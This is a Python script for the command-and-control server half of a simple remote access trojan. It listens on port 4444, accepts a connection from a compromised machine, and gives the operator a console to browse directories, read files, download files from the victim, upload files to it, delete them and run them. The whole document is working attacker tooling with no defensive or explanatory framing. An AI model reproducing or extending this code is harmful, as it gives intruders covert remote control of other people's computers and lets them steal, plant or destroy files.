import socket

class server_config():
	def __init__(self, host, port):
		self.host = host
		self.port = port
		
	def server_connection(self):
		global conn, addr, server
		server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		server.bind((self.host, self.port))
		print(f"[*] Server started on {self.host}:{self.port}")
		server.listen(1)
		conn, addr = server.accept()
		print(f"[*] Connection from {addr}\n")

	def server_stage(self):

		def build_package():
				global package
				package = conn.recv(5000)
				package = package.decode()
				print(f"{package}\n")

		while True:
			user_input = input(str(f"{addr} >> "))
			conn.send(user_input.encode())

			if user_input == 'help':
				print("Commands:")
				print("Current Directory - pwd")
				print("Change Directory - cd")
				print("List Directory - ls")
				print("View File - cat")
				print("Download File - get")
				print("Send File - put")
				print("Delete File - del")
				print("Start File - run")
				print("Close Session - exit\n")

			elif user_input == 'exit':
				exit()

			elif user_input == 'pwd':
				build_package()	

			elif user_input == 'ls':
				build_package()

			elif user_input == 'cd':
				directory = input(str('Directory: '))
				conn.send(directory.encode())	
				build_package()

			elif user_input	== 'cat':
				file_dir = input(str('File directory: '))
				conn.send(file_dir.encode())
				file_raw = conn.recv(5000)
				print(f"{file_raw}\n")

			elif user_input == 'get':
				file_dir = input(str('File directory: '))
				conn.send(file_dir.encode())
				file_raw = conn.recv(10000)
				file_name = input(str('New file name: '))  
				file_new = open(file_name, 'wb')
				file_new.write(file_raw)
				file_new.close()
				print(f"Downloaded {file_dir} successfully and saved as {file_name}\n")

			elif user_input == 'put':
				file_dir = input(str('File Directory: '))
				file_name = input(str('New file name: '))
				file_data = open(file_dir, 'rb')
				file_package = file_data.read(5000)
				conn.send(file_name.encode())
				conn.send(file_package)
				print(f"Sent {file_dir} successfully and saved as {file_name}\n")

			elif user_input == 'del':
				file_dir = input(str('File directory: '))
				conn.send(file_dir.encode())
				print(f"File {file_dir} deleted successfully\n")

			elif user_input == 'run':
				file_dir = input(str('File directory: '))
				conn.send(file_dir.encode())
				file_data = conn.recv(5000)
				file_package = file_data.decode()
				print(f'File {file_dir} started successfully\n') 

			else:
				print("Invalid Command\n")

config = server_config('192.168.1.126', 4444)
config.server_connection()
config.server_stage()